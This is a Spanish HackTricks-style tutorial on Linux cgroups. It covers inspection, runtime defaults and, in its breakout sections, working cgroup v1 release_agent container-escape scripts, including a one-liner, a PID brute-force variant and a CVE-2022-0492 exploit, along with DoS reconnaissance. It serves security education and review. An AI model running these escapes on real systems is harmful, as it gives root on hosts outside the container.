# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Descripción general

Los **control groups** de Linux son el mecanismo del kernel utilizado para agrupar procesos con fines de contabilidad, limitación, priorización y aplicación de políticas. Si los namespaces tratan principalmente de aislar la vista de los recursos, los cgroups se encargan principalmente de controlar **cuánto** de esos recursos puede consumir un conjunto de procesos y, en algunos casos, **con qué clases de recursos** pueden interactuar. Los contenedores dependen constantemente de los cgroups, incluso cuando el usuario nunca los consulta directamente, porque casi todos los runtimes modernos necesitan una forma de indicar al kernel: "estos procesos pertenecen a esta carga de trabajo y estas son las reglas de recursos que se les aplican".

Por este motivo, los container engines colocan cada contenedor nuevo en su propio subárbol de cgroup. Una vez que el árbol de procesos se encuentra allí, el runtime puede limitar la memoria, restringir el número de PIDs, asignar un peso al uso de la CPU, regular la E/S y restringir el acceso a dispositivos. En un entorno de producción, esto es esencial tanto para la seguridad en entornos multi-tenant como para una correcta higiene operativa. Un contenedor sin controles de recursos significativos puede agotar la memoria, inundar el sistema con procesos o monopolizar la CPU y la E/S de formas que desestabilicen el host o las cargas de trabajo vecinas.

Desde una perspectiva de seguridad, los cgroups son importantes por dos motivos distintos. En primer lugar, unos límites de recursos incorrectos o inexistentes permiten realizar ataques sencillos de denegación de servicio. En segundo lugar, algunas funciones de los cgroups, especialmente en configuraciones antiguas de **cgroup v1**, han creado históricamente primitivas potentes de breakout cuando podían escribirse desde dentro de un contenedor.

## v1 frente a v2

Existen dos modelos principales de cgroups en uso. **cgroup v1** expone varias jerarquías de controladores, y los writeups de exploits antiguos suelen centrarse en las semánticas extrañas y, en ocasiones, demasiado potentes disponibles en ese modelo. **cgroup v2** introduce una jerarquía más unificada y, por lo general, un comportamiento más limpio. Las distribuciones modernas prefieren cada vez más cgroup v2, pero todavía existen entornos mixtos o heredados, lo que significa que ambos modelos siguen siendo relevantes al revisar sistemas reales.

La diferencia es importante porque algunas de las historias más conocidas de breakout de contenedores, como los abusos de **`release_agent`** en cgroup v1, están vinculadas específicamente al comportamiento antiguo de los cgroups. Un lector que encuentre un exploit de cgroups en un blog y después lo aplique ciegamente a un sistema moderno que solo use cgroup v2 probablemente no comprenderá qué es realmente posible en el objetivo.

## Inspección

La forma más rápida de comprobar dónde se encuentra el shell actual es:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
El archivo `/proc/self/cgroup` muestra las rutas de cgroup asociadas con el proceso actual. En un host moderno con cgroup v2, normalmente verás una entrada unificada. En hosts antiguos o híbridos, es posible que veas varias rutas de controladores de v1. Una vez que conozcas la ruta, puedes inspeccionar los archivos correspondientes en `/sys/fs/cgroup` para ver los límites y el uso actual.

En un host con cgroup v2, los siguientes comandos son útiles:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Estos archivos revelan qué controladores existen y cuáles están delegados a cgroups secundarios. Este modelo de delegación es importante en entornos rootless y gestionados por systemd, donde el runtime quizá solo pueda controlar el subconjunto de funcionalidades de cgroups que la jerarquía principal delega.

## Laboratorio

Una forma de observar cgroups en la práctica es ejecutar un contenedor con memoria limitada:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
También puedes probar un contenedor limitado por PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Estos ejemplos son útiles porque ayudan a conectar el flag del runtime con la interfaz de archivos del kernel. El runtime no aplica la regla por arte de magia; escribe la configuración relevante de cgroup y, después, deja que el kernel la aplique al árbol de procesos.

## Uso del Runtime

Docker, Podman, containerd y CRI-O dependen de los cgroups como parte de su funcionamiento normal. Las diferencias normalmente no están relacionadas con si usan cgroups, sino con **qué valores predeterminados eligen**, **cómo interactúan con systemd**, **cómo funciona la delegación rootless** y **cuánta configuración se controla en el nivel del engine frente al nivel de la orquestación**.

En Kubernetes, las solicitudes y los límites de recursos terminan convirtiéndose en configuración de cgroup en el nodo. La ruta desde el YAML del Pod hasta la aplicación por parte del kernel pasa por el kubelet, el runtime CRI y el runtime OCI, pero los cgroups siguen siendo el mecanismo del kernel que finalmente aplica la regla. En entornos Incus/LXC, los cgroups también se utilizan ampliamente, especialmente porque los system containers suelen exponer un árbol de procesos más rico y expectativas operativas más parecidas a las de una VM.

## Configuraciones incorrectas y Breakouts

La historia clásica de seguridad de los cgroups es el mecanismo **`release_agent` de cgroup v1** con permisos de escritura. En ese modelo, si un atacante podía escribir en los archivos de cgroup adecuados, habilitar `notify_on_release` y controlar la ruta almacenada en `release_agent`, el kernel podía terminar ejecutando una ruta elegida por el atacante en los initial namespaces del host cuando el cgroup quedara vacío. Por eso los writeups antiguos prestan tanta atención a los permisos de escritura de los controladores de cgroup, las opciones de montaje y las condiciones de namespaces/capabilities.

Incluso cuando `release_agent` no está disponible, los errores de configuración de cgroups siguen siendo importantes. Un acceso demasiado amplio a dispositivos puede hacer que los dispositivos del host sean accesibles desde el container. La ausencia de límites de memoria y de PID puede convertir una simple ejecución de código en un DoS del host. Una delegación débil de cgroups en escenarios rootless también puede llevar a los defensores a asumir que existe una restricción cuando, en realidad, el runtime nunca pudo aplicarla.

### Contexto de `release_agent`

La técnica `release_agent` solo se aplica a **cgroup v1**. La idea básica es que, cuando el último proceso de un cgroup termina y `notify_on_release=1` está establecido, el kernel ejecuta el programa cuya ruta está almacenada en `release_agent`. Esa ejecución ocurre en los **initial namespaces del host**, lo que convierte un `release_agent` modificable en una primitiva de escape del container.

Para que la técnica funcione, el atacante normalmente necesita:

- una jerarquía **cgroup v1** modificable
- la capacidad de crear o usar un cgroup hijo
- la capacidad de establecer `notify_on_release`
- la capacidad de escribir una ruta en `release_agent`
- una ruta que resuelva a un ejecutable desde el punto de vista del host

### PoC clásica

La PoC histórica de una sola línea es:<sup>[[1]](#references)</sup>
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Este PoC escribe una ruta de payload en `release_agent`, activa la liberación del cgroup y luego lee el archivo de salida generado en el host.

### Recorrido legible

La misma idea es más fácil de entender si se divide en pasos.<sup>[[1]](#references)</sup>

1. Crea y prepara un cgroup con permisos de escritura:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifica la ruta del host que corresponde al sistema de archivos del contenedor:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Deja un payload que será visible desde la ruta del host:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Activar la ejecución haciendo que el cgroup quede vacío:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
El efecto es la ejecución del payload en el host con privilegios de root del host. En un exploit real, el payload normalmente escribe un archivo de prueba, inicia un reverse shell o modifica el estado del host.

### Variante de ruta relativa usando `/proc/<pid>/root`

En algunos entornos, la ruta del host al sistema de archivos del contenedor no es evidente o está oculta por el storage driver. En ese caso, la ruta del payload puede expresarse mediante `/proc/<pid>/root/...`, donde `<pid>` es un PID del host perteneciente a un proceso del contenedor actual. Esa es la base de la variante de fuerza bruta de rutas relativas:<sup>[[2]](#references)</sup>
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
El truco relevante aquí no es el brute force en sí, sino la forma de la ruta: `/proc/<pid>/root/...` permite al kernel resolver un archivo dentro del filesystem del contenedor desde el namespace del host, incluso cuando la ruta de almacenamiento directa del host no se conoce de antemano.

### Variante de CVE-2022-0492

En 2022, CVE-2022-0492 mostró que la escritura en `release_agent` en cgroup v1 no comprobaba correctamente `CAP_SYS_ADMIN` en el **initial** user namespace. Esto hizo que la técnica fuera mucho más accesible en kernels vulnerables, ya que un proceso del contenedor que pudiera montar una jerarquía de cgroup podía escribir en `release_agent` sin tener privilegios previamente en el user namespace del host.<sup>[[3]](#references)</sup>

Exploit mínimo:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
En un kernel vulnerable, el host ejecuta `/proc/self/exe` con privilegios de root del host.

Para un abuso práctico, empieza comprobando si el entorno todavía expone rutas de cgroup-v1 con permisos de escritura o acceso peligroso a dispositivos:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Si `release_agent` está presente y se puede escribir en él, ya estás en territorio de legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Si la propia ruta del cgroup no permite un escape, el siguiente uso práctico suele ser la denegación de servicio o el reconocimiento:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Estos comandos indican rápidamente si el workload tiene margen para ejecutar un fork-bomb, consumir memoria de forma agresiva o abusar de una interfaz de cgroup legacy con permisos de escritura.

## Comprobaciones

Al revisar un objetivo, el propósito de las comprobaciones de cgroup es determinar qué modelo de cgroup se está utilizando, si el contenedor puede acceder a rutas de controladores con permisos de escritura y si las antiguas primitivas de breakout, como `release_agent`, son siquiera relevantes.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Qué resulta interesante aquí:

- Si `mount | grep cgroup` muestra **cgroup v1**, los writeups antiguos sobre breakout adquieren mayor relevancia.
- Si `release_agent` existe y es accesible, merece inmediatamente una investigación más profunda.
- Si la jerarquía de cgroups visible permite escritura y el container también tiene capabilities potentes, el entorno merece una revisión mucho más exhaustiva.

Si descubres **cgroup v1**, montajes de controladores con permisos de escritura y un container que también tiene capabilities potentes o una protección seccomp/AppArmor débil, esa combinación merece especial atención. Los cgroups suelen considerarse un tema aburrido de gestión de recursos, pero históricamente han formado parte de algunas de las cadenas de container escape más instructivas, precisamente porque la frontera entre el "control de recursos" y la "influencia sobre el host" no siempre era tan clara como se suponía.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual habitual |
| --- | --- | --- | --- |
| Docker Engine | Habilitado de forma predeterminada | Los containers se colocan automáticamente en cgroups; los límites de recursos son opcionales, salvo que se establezcan mediante flags | omitir `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Habilitado de forma predeterminada | `--cgroups=enabled` es el valor predeterminado; los valores predeterminados del namespace de cgroups varían según la versión de cgroups (`private` en cgroup v2, `host` en algunas configuraciones de cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, acceso relajado a dispositivos, `--privileged` |
| Kubernetes | Habilitado mediante el runtime de forma predeterminada | Los Pods y containers se colocan en cgroups mediante el runtime del nodo; el control detallado de recursos depende de `resources.requests` / `resources.limits` | omitir solicitudes/límites de recursos, acceso privilegiado a dispositivos, configuración incorrecta del runtime a nivel de host |
| containerd / CRI-O | Habilitado de forma predeterminada | los cgroups forman parte de la gestión normal del ciclo de vida | configuraciones directas del runtime que relajen los controles de dispositivos o expongan interfaces heredadas de cgroup v1 con permisos de escritura |

La distinción importante es que la **existencia de cgroups** suele ser predeterminada, mientras que las **restricciones de recursos útiles** suelen ser opcionales, salvo que se configuren explícitamente.

## Referencias

- [1] [Comprender los container escapes de Docker](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [2] [Container Escape privilegiado - Control Groups release_agent](http://blog.ajxchapman.com/containers/2020/11/19/privileged-container-escape.html)
- [3] [Nueva vulnerabilidad de Linux CVE-2022-0492 que afecta a los Cgroups: ¿pueden escapar los containers?](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)

{{#include ../../../../banners/hacktricks-training.md}}
